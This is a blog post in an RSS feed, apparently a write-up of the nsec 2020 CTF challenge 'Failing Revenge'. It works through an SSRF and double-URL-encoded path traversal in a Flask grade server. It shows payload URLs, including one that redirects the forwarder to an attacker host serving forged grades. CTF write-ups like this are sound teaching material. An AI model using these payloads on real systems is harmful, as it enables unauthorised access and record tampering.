<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on stargravy</title>
		<link>https://stargravy.ca/posts/</link>
		<description>Recent content in Posts on stargravy</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<lastBuildDate>Mon, 18 May 2020 00:00:00 +0000</lastBuildDate>
		<atom:link href="https://stargravy.ca/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Failing Revenge - nsec 2020 CTF</title>
			<link>https://stargravy.ca/posts/failing-revenge/</link>
			<pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
			
			<guid>https://stargravy.ca/posts/failing-revenge/</guid>
			<description>Intro In this challenge, Severity High forum member el_133t is challenging us to get revenge on Wilton Trojan, a student from another school who has been spamming the Severity High IRC.
The plan for revenge is to change Wilton&amp;rsquo;s grade in Computer Science from an A+ to an F on the school&amp;rsquo;s grade server.
  el_1337&amp;rsquo;s forum post
  The challenge contains two flags to find. We are given the source code, and a link to the application&amp;rsquo;s front-end at grades.</description>
			<content type="html"><![CDATA[<h2 id="intro">Intro</h2>
<p>In this challenge, Severity High forum member el_133t is challenging us to get revenge on Wilton Trojan, a student from another school who has been spamming the Severity High IRC.</p>
<p>The plan for revenge is to change Wilton&rsquo;s grade in Computer Science from an A+ to an F on the school&rsquo;s grade server.</p>
<figure>
    <img src="/failing-revenge-1.png"
         alt="el_1337&#39;s forum post"/> <figcaption>
            <p>el_1337&rsquo;s forum post</p>
        </figcaption>
</figure>

<p>The challenge contains two flags to find. We are given the source code, and a link to the application&rsquo;s front-end at <code>grades.ctf</code></p>
<h2 id="the-application">The Application</h2>
<p>The application consists of <code>grades.ctf</code>, a front-end application written in flask, which communicates with <code>gradeservers.ctf</code>, another flask app working as the back-end, via a forwarder.</p>
<figure>
    <img src="/failing-revenge-2.png"
         alt="The grades application"/> <figcaption>
            <p>The grades application network diagram from the source code</p>
        </figcaption>
</figure>

<p>Taking a quick look at <code>grades.ctf</code> in a browser shows that it is a pretty simple application which lists schools, courses, students, and their grades.
If we look at the routes defined in the front-end&rsquo;s <code>routes.py</code>, we can see that they each make requests to the grades server by calling <code>_api(endpoint)</code>, which is defined as follows:</p>
<pre><code>def _api(endpoint):
    &quot;&quot;&quot;
    Keyword Arguments:
    API endpoint to reach endpoint -- 
    &quot;&quot;&quot;
    high_school_uri = _get_school_uri()
    if high_school_uri:
        from front-end import legacy_http
        req = legacy_http.request(request.method, f'{high_school_uri}{endpoint}')
        ans = json.loads(req.output)

        _err_handle(ans)
        return (ans)

</code></pre><p>Notably, the legacy_http request inherits the request method, and sets the requested url to <code>{high_school_uri}{endpoint}</code>, where <code>high_school_uri</code> is defined as <code>http://{Config.FORWARD_SERVER}/{Config.SCHOOL_GRADESERVERS[school_name]}</code>.</p>
<p>A quick check of the <code>config.py</code> shows the forward server and gradeserver variables:</p>
<pre><code>    FORWARD_SERVER = 'gradeservers.ctf:80'

    # http is X001
    # https is X002
    SCHOOL_GRADESERVERS = {'Severity High':   '[::1]:5001',
                           'Stuyvesant High': '[::1]:6001'}
</code></pre><p>So, making a request for <strong>Wilton Trojan</strong>&lsquo;s grades on the front-end,</p>
<pre><code>http://grades.ctf/Stuyvesant High/student/1
</code></pre><p>becomes</p>
<pre><code>http://gradeservers.ctf:80/[::1]:6001/student/1
</code></pre><p>We can quickly see how the forwarder is determining which host it forwards to: <code>[::1]:6001</code> corresponds to localhost on port 6001.</p>
<blockquote>
<p>This is important to note because this could potentially lead to an <a href="https://portswigger.net/web-security/ssrf">SSRF vulnerability</a>, which could allow us to hijack the forwarder to make requests on our behalf.</p>
<p>Attempting to access this url directly gives a 403 Forbidden, but we&rsquo;ll come back to this for Flag 2.</p>
</blockquote>
<p>Once the request hits <code>gradeservers.ctf</code>, the request is translated into a query for the relevant data from the grades database.</p>
<p>Finally, looking through the source reveals where our two flags will be displayed if we can reach them:</p>
<hr>
<p><strong>The first flag</strong> (defined as <code>FLAG_ONE</code> in <code>gradeservers.ctf</code>'s <code>config.py</code>) will be returned if we can hit the <code>/flag</code> endpoint on the back-end:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FlagApi</span>(Resource):
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;status&#39;</span>:<span style="color:#e6db74">&#39;err&#39;</span>,<span style="color:#e6db74">&#39;description&#39;</span>:Config<span style="color:#f92672">.</span>FLAG_ONE})
</code></pre></div><hr>
<p><strong>The second flag</strong> (defined as <code>FLAG_TWO</code> in <code>grades.ctf</code>'s <code>config.py</code>) will be returned if we can manage to have <strong>Wilton Trojan</strong>&lsquo;s grade for Computer Science return from <code>gradeservers.ctf</code> as an <strong>F</strong> on the front-end&rsquo;s <code>/course/</code> endpoint, as seen in <code>grades.html</code> in the front-end source:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> grade<span style="color:#f92672">.</span>student_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Wilton Trojan&#39;</span> <span style="color:#f92672">and</span> grade<span style="color:#f92672">.</span>grade_score <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F&#39;</span> <span style="color:#f92672">and</span> course_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Computer Science&#39;</span> <span style="color:#f92672">%</span>}
<span style="color:#f92672">&lt;</span>td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;grade_score&#34;</span><span style="color:#f92672">&gt;</span>{{config<span style="color:#f92672">.</span>FLAG_TWO}}<span style="color:#f92672">&lt;/</span>td<span style="color:#f92672">&gt;</span>
{<span style="color:#f92672">%</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">%</span>}
<span style="color:#f92672">&lt;</span>td class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;grade_score&#34;</span><span style="color:#f92672">&gt;</span>{{ grade<span style="color:#f92672">.</span>grade_score }}<span style="color:#f92672">&lt;/</span>td<span style="color:#f92672">&gt;</span>
{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
</code></pre></div><hr>
<blockquote>
<p>It is also worth noting that the only inputs we can control as an attacker hitting the front-end are the <strong>school name</strong> (which is verified and errors out if it isn&rsquo;t valid) and the <strong>student or course ids</strong> when making requests to <code>/&lt;school_name&gt;/course/&lt;course_id&gt;</code> or <code>&lt;school_name&gt;/student/&lt;student_id&gt;</code>. 
Luckily, student and course ids are <strong>not</strong> validated before being passed to the forwarder.</p>
</blockquote>
<p>We will use all of this information to find the challenge&rsquo;s 2 flags.</p>
<hr>
<h2 id="flag-1---capturing-the-flag">Flag 1 - Capturing the /flag</h2>
<p>As noted above, we know exactly what we need to do to get this flag, which is to trick the forwarder to hit <code>/flag</code> on the back-end instead of <code>/student/id</code> or <code>/course/id</code>.</p>
<p>We control the <strong>student</strong> or <strong>course</strong> ids, which are not validated before being forwarded as part of a request to the back-end.</p>
<p>Immediately what comes to mind are the techniques used for <a href="https://portswigger.net/web-security/file-path-traversal">path/directory traversal</a>, because if we can force the forwarder&rsquo;s request to become <code>/student/../flag</code> we win.</p>
<p>This was initially attempted by passing <code>%2e%2e%2fflag</code>, which failed as the url-encoded characters were still interpreted for the initial request, and resulted in a 404.</p>
<p>The trick was to double url-encode the <code>%2f</code> character as <code>%252f</code>, which when passed to the forwarder became <code>%2f</code>, which means the request made to the front-end, <code>/student/..%252fflag</code>, hits the back-end as <code>/student/../flag</code>.</p>
<figure class="med">
    <img src="/failing-revenge-4.png"
         alt="capturing the /flag"/> <figcaption>
            <p>Capturing the /flag via BurpSuite</p>
        </figcaption>
</figure>

<hr>
<h2 id="flag-2---revenge-on-wilton">Flag 2 - Revenge on Wilton</h2>
<p>Flag 2 is a little bit more involved, as we need to somehow change Wilton&rsquo;s grade in computer science. We now know that we can hit any back-end endpoint we want using the technique used to get flag 1.</p>
<p>Additionally, since we know that the forwarder uses the first segment of the url passed to it to determine what host it sends a request to, we can achieve a fully attacker-controlled SSRF.</p>
<p>Initially, I thought this was going to be a more involved problem than it was, but I think it is interesting to look at where I went down the wrong path.</p>
<h3 id="the-wrong-path">The wrong path</h3>
<p>Looking at the routes defined in <code>gradeservers.ctf</code>'s <code>_init_.py</code> we see one which looks perfect for altering Walton&rsquo;s grade:</p>
<pre><code>------ __init__.py ------
    ## HTTPS only
    # Change student grade for course
    api.add_resource(GradeApi, '/grade/&lt;student_id&gt;/&lt;course_id&gt;/&lt;grade_score&gt;')

------ grade.py -------

    @https  # this calls a function from utils.py which 
            # checks whether HTTPS is being used

    def patch(self, student_id, course_id, grade_score):
        grade = Grade.query.filter(Grade.student_id == student_id,
                                   Grade.course_id == course_id).first()
        if grade:
            grade.grade_score = grade_score
            db.session.commit()
            return jsonify({'status':'ok'})
        return jsonify({'status':'err'})
</code></pre><p>This endpoint points to the <code>GradeApi()</code> class, which can handle normal <code>GET</code> requests, but also defines a handler for <code>PATCH</code> requests. If we could pass the appropriate parameters (student_id, course_id, and grade) to <code>GradeApi()</code> with a <code>PATCH</code> request, we could change Wilton&rsquo;s grade. 
Unfortunately, making <code>PATCH</code> requests requires HTTPS instead of HTTP.</p>
<p>As noted in the section <code>config.py</code> of <code>grades.ctf</code> above, the <code>[::1]:6001</code> address points to the HTTP grade server for Stuyvesant High, where as <code>[::1]:6002</code> points to the HTTPS version.</p>
<p>Unfortunately, the front-end only sends HTTP requests to the forwarder, which only appeared to forward HTTP requests, even if pointing at the HTTPS port.</p>
<p>This is where I believed the challenge was going to be more involved than it ended up being.</p>
<p>I believed I was going to have to use the SSRF to send the request to our attacker controlled host at <code>shell.ctf</code>, and use something like <a href="https://mitmproxy.org/">mitmproxy</a> to intercept the forwarder traffic, change it to an HTTPS request and point it to the appropriate endpoint with the proper parameters.</p>
<p>This wouldn&rsquo;t be impossible, but would definitely be a bit more complicated than the option we went with : we could just pretend to be the grade server and return the appropriate response to the forwarder&rsquo;s request.</p>
<h3 id="tricking-the-front-end-into-giving-us-flag-2">Tricking the front-end into giving us flag 2</h3>
<p>So all we have to do is point the forwarder&rsquo;s request to an attacker controlled host (in this case, <code>shell.ctf</code> was our attacker controlled machine for the CTF), and have the attacker machine respond with an appropriate JSON body which indicates that Wilton failed his course.</p>
<p>Remembering the SSRF we mentioned above, we know that when the forwarder receives <code>http://gradeservers.ctf:80/&lt;some ip&gt;:&lt;port&gt;/some_dir</code> it forwards the response to <code>http://&lt;some ip&gt;:&lt;port&gt;/some_dir</code>. So we can force it to look for Wilton&rsquo;s grades on our attacker controlled server.</p>
<p>To complete this we need to take the following steps:</p>
<ul>
<li>Host a quick json file (<code>grades.json</code>) on an http server (python&rsquo;s SimpleHTTPServer in this case) listening on the attacker machine (<code>shell.ctf</code>), with the json file containing the following payload:</li>
</ul>
<pre><code># Wilton's id: 15, Computer Science course id: 1
{ 
  course_name&quot;:&quot;Computer Science&quot;,
  &quot;grades&quot;:
  [{ 
    &quot;student_name&quot;:&quot;Wilton Trojan&quot;, 
    &quot;grade_score&quot;:&quot;F&quot;, 
    &quot;student_id&quot;:15
    }]
}
</code></pre><ul>
<li>Send the following request to the front-end, which uses the trick from Flag 1 to force the forwarder to make its request to our attacker server:</li>
</ul>
<pre><code>http://grades.ctf/Stuyvesant High/course/..%252f..%252fshell.ctf:8080/grades.json
</code></pre><p>The forwarder will find the falsified grades in <code>grades.json</code>, and return it to the front-end. On noting that Wilton&rsquo;s grade in comupter science is now an <strong>F</strong>, the front-end application gives us the flag:</p>
<figure class="med">
    <img src="/failing-revenge-5.png"
         alt="flag 2"/> <figcaption>
            <p>Tricking the front-end into giving us the flag.</p>
        </figcaption>
</figure>

<hr>
]]></content>
		</item>
		
	</channel>
</rss>
